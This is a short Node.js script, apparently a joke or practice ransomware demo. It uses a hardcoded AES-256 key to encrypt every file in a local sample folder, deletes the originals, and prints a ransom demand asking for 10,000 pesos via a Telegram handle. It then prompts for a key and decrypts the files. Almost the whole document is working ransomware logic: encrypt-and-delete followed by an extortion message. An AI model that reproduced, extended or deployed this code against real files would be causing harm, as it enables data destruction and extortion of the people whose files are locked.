var encryptor = require('file-encryptor')
var fs = require('fs')

const readLine = require('readline').createInterface({
    input: process.stdin,
    output: process.stdout
});

var key = 'JOKE LANG TO!'
var options = { algorithm: 'aes256' };

const sampleFolder = './sample/';

fs.readdirSync(sampleFolder).forEach(file => {
    //ENCRYPT FILE
    encryptor.encryptFile(`${sampleFolder}${file}`, `${sampleFolder}${file}.encrypted`, key, options, function(err) {
        fs.unlinkSync(`${sampleFolder}${file}`)
        console.log(`File ${file} is encrypted!\n`)
      });
});

console.log('ENCRYPTED... PAY 10000 PESOS VIA TG: @hacker123 TO HAVE ACCESS AGAIN...\n');

readLine.question('ENTER DECRYPTION KEY: ', key => {
     //DECRYPT FILE
    fs.readdirSync(sampleFolder).forEach(file => {
        encryptor.decryptFile(`${sampleFolder}${file}`, `${sampleFolder}${file}`.replace('.encrypted', ''), key, options, function(err) {
            fs.unlinkSync(`${sampleFolder}${file}`)
            console.log(`File ${file} is decrypted!\n`)
          });
    });    
    readLine.close();
});